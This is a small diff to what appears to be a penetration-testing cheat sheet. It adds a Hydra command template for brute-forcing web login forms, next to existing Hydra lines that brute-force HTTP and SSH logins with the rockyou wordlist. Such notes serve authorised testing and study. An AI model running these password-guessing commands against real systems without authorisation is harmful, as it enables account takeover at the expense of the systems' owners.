@@ -16,3 +16,10 @@ hydra -l fox -P /usr/share/wordlists/rockyou.txt -u -s 80 IP_HOST http-head
 ```shell
 hydra -l USER -P /usr/share/wordlists/rockyou.txt ssh://IP_VICTIM:PORT
 ```
+
+- Brute force login form:
+
+```shell
+hydra -L USERFILE -P PASSWORDFILE DOMAIN/IP METHOD "REDIRECTIONURL:PARAMETERS:FAILMESSAGE:H=COOKIES"
+```
+
